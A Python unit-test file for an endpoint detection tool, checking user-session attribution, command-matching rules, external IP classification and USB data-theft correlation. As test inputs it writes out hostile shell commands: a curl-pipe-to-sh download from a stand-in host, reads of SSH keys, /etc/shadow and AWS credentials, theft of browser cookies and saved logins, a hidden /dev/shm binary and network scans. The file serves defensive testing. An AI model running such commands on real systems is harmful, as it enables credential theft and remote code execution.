"""Behavioral checks for attribution and high-impact false-positive boundaries."""
import unittest
import json
import sqlite3
from pathlib import Path

from endpoint_detect import SessionIndex, Findings, archive_hunt, command_match, external, campaigns

CFG = json.loads(Path(__file__).with_name("endpoint_config.json").read_text())


def event(ts, kind="CMD", user="-", rowid=1, command="", host="WS-0001", process="bash"):
    return dict(ts=f"2026-10-12T{ts}.000Z", host=host, event=kind, user=user,
                rowid=rowid, process=process, target=command)


class EndpointBehaviorTests(unittest.TestCase):
    def test_no_future_login_and_logout_boundary(self):
        s = SessionIndex([event("09:00:00", "LOGIN", "alice", 10),
                          event("10:00:00", "LOGOUT", "alice", 20),
                          event("11:00:00", "LOGIN", "bob", 30)])
        self.assertEqual(s.at("WS-0001", event("08:59:59")["ts"]), "none")
        self.assertEqual(s.at("WS-0001", event("09:30:00")["ts"]), "alice")
        self.assertEqual(s.at("WS-0001", event("10:00:00")["ts"], 19), "alice")
        self.assertEqual(s.at("WS-0001", event("10:00:00")["ts"], 21), "none")
        self.assertEqual(s.at("WS-0001", event("10:30:00")["ts"]), "none")
        self.assertEqual(s.at("WS-0001", event("11:30:00")["ts"]), "bob")

    def test_shared_lab_user_switch(self):
        s = SessionIndex([event("08:00:00", "LOGIN", "labuser0", 1),
                          event("12:00:00", "LOGOUT", "labuser0", 2),
                          event("12:00:00", "LOGIN", "labuser1", 3)])
        self.assertEqual(s.at("WS-0001", event("11:59:59")["ts"]), "labuser0")
        self.assertEqual(s.at("WS-0001", event("13:00:00")["ts"]), "labuser1")

    def test_unrelated_logout_does_not_remove_current_user(self):
        s = SessionIndex([event("08:00:00", "LOGIN", "alice", 1),
                          event("09:00:00", "LOGIN", "bob", 2),
                          event("10:00:00", "LOGOUT", "alice", 3)])
        self.assertEqual(s.at("WS-0001", event("10:30:00")["ts"]), "bob")

    def test_secret_reads_are_not_public_keys_or_metadata(self):
        for command in ("cat ~/.ssh/id_rsa.pub", "cat /etc/passwd",
                        "ls -l /etc/shadow && cat /etc/passwd | wc -l"):
            self.assertIsNone(command_match(event("12:00:00", command=command), CFG))
        for command in ("cat ~/.ssh/id_rsa", "cat /etc/shadow-",
                        "cat ~/.aws/credentials", "cp ~/.config/google-chrome/Default/Cookies /tmp/c2.db",
                        "cat ~/.config/google-chrome/Default/Login\\ Data"):
            self.assertEqual(command_match(event("12:00:00", command=command), CFG)[0], 4)

    def test_shell_process_controls_category(self):
        cmd = "curl -s http://untrusted.example/x | sh"
        self.assertEqual(command_match(event("12:00:00", command=cmd), CFG)[2], "Malware delivery")
        self.assertEqual(command_match(event("12:00:00", command=cmd, process="plugin-host"), CFG)[2], "Host intrusion signs")
        self.assertIsNone(command_match(event("12:00:00", command="curl -s https://ctf-tools.hackedu.io/setup.sh | bash"), CFG))

    def test_temp_execution_and_scanner_boundaries(self):
        for command in ("python /tmp/pip-install-9f2a/setup.py install", "cat /tmp/output.txt", "crontab -l", "tail -f /var/log/syslog"):
            self.assertIsNone(command_match(event("12:00:00", command=command), CFG))
        self.assertEqual(command_match(event("12:00:00", command="chmod +x /dev/shm/.x && /dev/shm/.x &"), CFG)[0], 3)
        self.assertIsNone(command_match(event("12:00:00", command="nmap -sV test.bearcorp.com", host="SRV-02"), CFG))
        self.assertEqual(command_match(event("12:00:00", command="nmap -sS -p- 10.2.0.0/24"), CFG)[2], "Reconnaissance")

    def test_fixture_external_ranges(self):
        for target in ("198.18.44.11:443", "203.0.113.24:443"):
            self.assertTrue(external(target))
        for target in ("10.2.0.10:443", "192.168.1.1:22", "169.254.169.254:80"):
            self.assertFalse(external(target))

    def test_repeat_campaigns_keep_first_and_separate_later_actions(self):
        groups = list(campaigns([event("12:04:00", rowid=3), event("12:00:00", rowid=1),
                                 event("12:01:00", rowid=2)], 90))
        self.assertEqual([len(g) for g in groups], [2, 1])
        self.assertEqual(groups[0][0]["ts"], event("12:00:00")["ts"])

    def test_hidden_archive_without_transfer_remains_review_only(self):
        with sqlite3.connect(":memory:") as con:
            con.row_factory = sqlite3.Row
            con.execute("CREATE TABLE usb(ts TEXT,host TEXT,user TEXT,action TEXT,device TEXT,mb INTEGER)")
            findings = Findings(SessionIndex([event("09:00:00", "LOGIN", "alice", 1)]))
            archive = event("09:30:00", rowid=2, command="tar czf /tmp/.sysdata.tgz /home/ /etc/ 2>/dev/null")
            archive_hunt(con, CFG, findings, [archive])
            self.assertEqual(findings.records, [])
            self.assertEqual(findings.review[0]["rule"], "hidden_sensitive_archive_without_transfer")
            self.assertEqual(findings.review[0]["event"], archive)

    def test_usb_correlation_preserves_archive_time_process_and_asof_user(self):
        with sqlite3.connect(":memory:") as con:
            con.row_factory = sqlite3.Row
            con.execute("CREATE TABLE usb(ts TEXT,host TEXT,user TEXT,action TEXT,device TEXT,mb INTEGER)")
            con.execute("INSERT INTO usb VALUES(?,?,?,?,?,?)", (event("09:40:00")["ts"], "WS-0001", "alice", "copy", "USB-1", 3000))
            sessions = SessionIndex([event("09:00:00", "LOGIN", "alice", 1),
                                     event("10:00:00", "LOGOUT", "alice", 3),
                                     event("11:00:00", "LOGIN", "bob", 4)])
            findings = Findings(sessions)
            archive = event("09:30:00", rowid=2, command="zip -qr /tmp/photos.zip ~/Documents/ ~/Projects/")
            archive_hunt(con, CFG, findings, [archive])
            self.assertEqual([r["finding"] for r in findings.records], [{
                "category": "Data theft", "timestamp": archive["ts"], "host": "WS-0001",
                "user": "alice", "process": "bash"}])
            con.execute("UPDATE usb SET mb=750")
            findings = Findings(sessions)
            archive_hunt(con, CFG, findings, [archive])
            self.assertEqual(findings.records, [])


if __name__ == "__main__":
    unittest.main()
